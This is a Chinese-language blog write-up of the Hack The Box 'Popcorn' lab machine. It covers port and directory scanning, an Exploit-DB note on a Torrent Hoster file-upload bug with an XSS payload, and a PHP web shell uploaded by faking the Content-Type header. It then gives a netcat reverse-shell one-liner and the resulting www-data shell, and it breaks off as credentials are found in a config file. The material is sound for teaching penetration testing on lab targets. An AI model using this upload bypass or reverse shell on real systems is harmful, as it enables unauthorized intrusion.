

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：Torrent Hoster 文件上传漏洞、木马文件上传格式绕过、Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW’ ‘PTRACE_POKEDATA’ Race Condition Privilege Escalation (&#x2F;etc&#x2F;passwd Method)">
<meta property="og:type" content="article">
<meta property="og:title" content="Popcorn-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/01/02/Popcorn-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：Torrent Hoster 文件上传漏洞、木马文件上传格式绕过、Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW’ ‘PTRACE_POKEDATA’ Race Condition Privilege Escalation (&#x2F;etc&#x2F;passwd Method)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/6.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/7.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/8.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/9.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/10.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/11.png">
<meta property="og:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/12.png">
<meta property="article:published_time" content="2024-01-02T15:50:55.000Z">
<meta property="article:modified_time" content="2024-01-10T08:53:50.903Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Popcorn-htb-writeup/1.png">
  
  
  
  <title>Popcorn-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Popcorn-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-02 23:50" pubdate>
          2024年1月2日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          61k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          508 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Popcorn-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：Torrent Hoster 文件上传漏洞、木马文件上传格式绕过、Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW’ ‘PTRACE_POKEDATA’ Race Condition Privilege Escalation (&#x2F;etc&#x2F;passwd Method)</p>
<span id="more"></span>  

<p>参考链接：<code>https://cyberkareem.medium.com/hackthebox-popcorn-walkthrough-68a0e719c8bc</code></p>
<p>参考链接：<code>https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html</code></p>
<p>参考链接：<code>https://kalistudy-bucket.oss-cn-hongkong.aliyuncs.com/uploads/2019/12/Popcorn.pdf</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.6</p>
<p>2、扫描下开放端口情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.3]─[shiyan@htb-rlecfd7idm]─[~/Desktop]<br>└──╼ [★]$ sudo nmap -p- -Pn --min-rate=10000 10.10.10.6<br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-02 12:50 GMT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.6<br>Host is up (0.096s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>┌─[us-vip-22]─[10.10.14.3]─[shiyan@htb-rlecfd7idm]─[~/Desktop]<br>└──╼ [★]$ sudo nmap -p22,80 -sV -sC --min-rate=5000 10.10.10.6<br>Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-02 13:02 GMT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.6<br>Host is up (0.0037s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)<br>|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)<br>80/tcp open  http    Apache httpd 2.2.12<br>|_http-server-header: Apache/2.2.12 (Ubuntu)<br>|_http-title: Did not follow redirect to http://popcorn.htb/<br>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.83 seconds<br></code></pre></td></tr></table></figure>

<p>3、这里发现了个新增域名，本地绑定下hosts</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.3]─[shiyan@htb-rlecfd7idm]─[~/Desktop]<br>└──╼ [★]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.10.6 popcorn.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>10.10.10.6 popcorn.htb<br></code></pre></td></tr></table></figure>

<p>4、针对发现的80端口WEB服务先扫描下目录情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.3]─[shiyan@htb-rlecfd7idm]─[~/Desktop]<br>└──╼ [★]$ dirsearch -u http://popcorn.htb/<br>Directory /usr/lib/python3/dist-packages/dirsearch is not writable<br>Directory /usr/lib/python3/dist-packages/dirsearch is not writable<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30<br>Wordlist size: 10903<br><br>Output File: /usr/lib/python3/dist-packages/dirsearch/reports/popcorn.htb/-_24-01-02_13-09-20.txt<br><br>Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-24-01-02_13-09-20.<span class="hljs-built_in">log</span><br><br>Target: http://popcorn.htb/<br><br>[13:09:21] Starting: <br>[13:09:26] 200 -  177B  - /index<br>[13:09:26] 200 -  177B  - /index.html<br>[13:09:29] 200 -   47KB - /test.php<br>[13:09:29] 200 -   48KB - /test/tmp/<br>[13:09:29] 200 -   48KB - /test/<br>[13:09:29] 200 -   48KB - /test/reports<br>[13:09:29] 200 -   48KB - /test/version_tmp/<br>[13:09:29] 200 -   47KB - /test<br><br>Task Completed<br>&lt;dirsearch.dirsearch.Program object at 0x7fdf28f8db50&gt;<br><br><br>┌─[us-vip-22]─[10.10.14.3]─[shiyan@htb-rlecfd7idm]─[~/Desktop]<br>└──╼ [★]$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://popcorn.htb/ --wordlist=/usr/share/dirb/wordlists/common.txt <br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://popcorn.htb/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirb/wordlists/common.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2024/01/02 13:17:43 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.hta                 (Status: 403) [Size: 283]<br>/.htpasswd            (Status: 403) [Size: 288]<br>/.htaccess            (Status: 403) [Size: 288]<br>/cgi-bin/             (Status: 403) [Size: 287]<br>/index                (Status: 200) [Size: 177]<br>/index.html           (Status: 200) [Size: 177]<br>/test                 (Status: 200) [Size: 47353]<br>/torrent              (Status: 301) [Size: 312] [--&gt; http://popcorn.htb/torrent/]<br>Progress: 4614 / 4615 (99.98%)                                                  [ERROR] 2024/01/02 13:17:54 [!] Get <span class="hljs-string">&quot;http://popcorn.htb/server-status&quot;</span>: context deadline exceeded (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers)<br>                                                                                 <br>===============================================================<br>2024/01/02 13:17:54 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>

<p>5、到这里，根据扫描的目录情况，是发现了一些信息的</p>
<p><code>http://popcorn.htb/test</code></p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p><code>http://popcorn.htb/torrent/</code></p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<p>6、在这个页面上发现可以自行注册账号，我们注册了以下的测试账号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Username: 	<span class="hljs-built_in">test</span><br>Password: 	<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>7、这里使用 searchsploit 进行扫描目标系统的漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit Torrent Hoster<br>------------------------------------------------------- ---------------------------------<br> Exploit Title                                         |  Path<br>------------------------------------------------------- ---------------------------------<br>Torrent Hoster - Remount Upload                        | php/webapps/11746.txt<br>------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit -m php/webapps/11746.txt<br>  Exploit: Torrent Hoster - Remount Upload<br>      URL: https://www.exploit-db.com/exploits/11746<br>     Path: /usr/share/exploitdb/exploits/php/webapps/11746.txt<br>    Codes: N/A<br> Verified: False<br>File Type: HTML document, ASCII text<br>Copied to: /home/kali/桌面/11746.txt<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cat</span> 11746.txt <br>========================================================================================<br>| <span class="hljs-comment"># Title    : Torrent Hoster Remont Upload Exploit</span><br>| <span class="hljs-comment"># Author   : El-Kahina</span><br>| <span class="hljs-comment"># Home     : www.h4kz.com                                                                              |</span><br>| <span class="hljs-comment"># Script   : Powered by Torrent Hoster.</span><br>| <span class="hljs-comment"># Tested on: windows SP2 Fran&amp;#65533;ais V.(Pnx2 2.0) + Lunix Fran&amp;#65533;ais v.(9.4 Ubuntu)</span><br>| <span class="hljs-comment"># Bug      : Upload</span><br>|<br>======================      Exploit By El-Kahina       =================================<br> <span class="hljs-comment"># Exploit  :</span><br><br> 1 - use tamper data :<br><br> http://127.0.0.1/torrenthoster//torrents.php?mode=upload<br><br> 2-<br>    &lt;center&gt;<br>   Powered by Torrent Hoster<br>        &lt;br /&gt;<br>        &lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> action=<span class="hljs-string">&quot;http://127.0.0.1/torrenthoster/upload.php&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;form&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> onsubmit=<span class="hljs-string">&quot;a=document.getElementById(&#x27;form&#x27;).style;a.display=&#x27;none&#x27;;b=document.getElementById(&#x27;part2&#x27;).style;b.display=&#x27;inline&#x27;;&quot;</span> style=<span class="hljs-string">&quot;display: inline;&quot;</span>&gt;<br>        &lt;strong&gt;&amp;<span class="hljs-comment">#65533;&amp;#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;:&lt;/strong&gt; &lt;?php echo $maxfilesize; ?&gt;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&lt;br /&gt;</span><br>&lt;br&gt;<br>        &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span> size=<span class="hljs-string">&quot;50&quot;</span> /&gt;&lt;br /&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;&amp;#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;upload&quot;</span> /&gt;<br>        &lt;/form&gt;<br>        &lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;part2&quot;</span> style=<span class="hljs-string">&quot;display: none;&quot;</span>&gt;&amp;<span class="hljs-comment">#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533; .. &amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533; &amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&amp;#65533;&lt;/div&gt;</span><br>        &lt;/center&gt;<br><br>3 - http://127.0.0.1/torrenthoster/torrents/  (to find shell)<br><br>4 - Xss:<br><br>http://127.0.0.1/torrenthoster/users/forgot_password.php/&gt;<span class="hljs-string">&quot;&gt;&lt;ScRiPt&gt;alert(00213771818860)&lt;/ScRiPt&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">==========================================</span><br><span class="hljs-string">Greetz : Exploit-db Team</span><br><span class="hljs-string">all my friend :(Dz-Ghost Team )</span><br><span class="hljs-string">im indoushka&#x27;s sister</span><br><span class="hljs-string">------------------------------------------</span><br></code></pre></td></tr></table></figure>

<p>8、可以看出来这里是存在一个上传漏洞的</p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>9、在简单的尝试中，发现这里没法上传图片，必须上传一个 torrent 的文件，所以翻了一些这个格式的文件，翻到了kali的历史的文件，这里就用这个文件上传吧。</p>
<p><code>https://old.kali.org/kali-images/kali-1.0.0/kali-linux-1.0.0-amd64.iso.torrent</code></p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>10、上传成功后，访问这个文件的目录地址</p>
<p><code>http://popcorn.htb/torrent/torrents.php?mode=details&amp;id=bc233c553f9f8562e0584e23c2a6765aa504e81b</code></p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
<p>11、经过摸索，发现在上传图片这里，可以上传图片类型的格式文件</p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<p>12、这里直接上传PHP的木马文件，只不过修改了下 Content-Type 这个标题头为 image&#x2F;png 来绕过这个上传限制</p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
<p>13、可以看到，成功上传了一个PHP的文件</p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
<p>14、经过翻找，上传的文件在上传目录里放着</p>
<p><code>http://popcorn.htb/torrent/upload/</code></p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
<p>15、我们直接通过上传的目录，运行一个反弹shell，来获取初始的权限</p>
<p><code>http://popcorn.htb/torrent/upload/bc233c553f9f8562e0584e23c2a6765aa504e81b.php</code></p>
<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.4 443 &gt;/tmp/f</code></p>
<p><img src="http://sh1yan.top/photo/Popcorn-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
<p>16、成功获取到初始的权限shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.10.6] 43798<br>sh: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">sh: python3: not found</span><br><span class="hljs-string">$ ls -la</span><br><span class="hljs-string">total 120</span><br><span class="hljs-string">drwxrwxrwx  2 www-data www-data  4096 Jan  2 15:55 .</span><br><span class="hljs-string">drwxr-xr-x 15 www-data www-data  4096 Mar 17  2017 ..</span><br><span class="hljs-string">-rw-r--r--  1 www-data www-data 59294 Mar 17  2017 723bc28f9b6f924cca68ccdff96b6190566ca6b4.png</span><br><span class="hljs-string">-rw-r--r--  1 www-data www-data 13585 Jan  2 15:55 bc233c553f9f8562e0584e23c2a6765aa504e81b.php</span><br><span class="hljs-string">-rw-r--r--  1 www-data www-data 33029 Jun  2  2007 noss.png</span><br><span class="hljs-string">$ pwd</span><br><span class="hljs-string">/var/www/torrent/upload</span><br></code></pre></td></tr></table></figure>

<p>17、通过各种网站目录翻找，终于找到了一个配置文件，里面涉及账号密码</p>
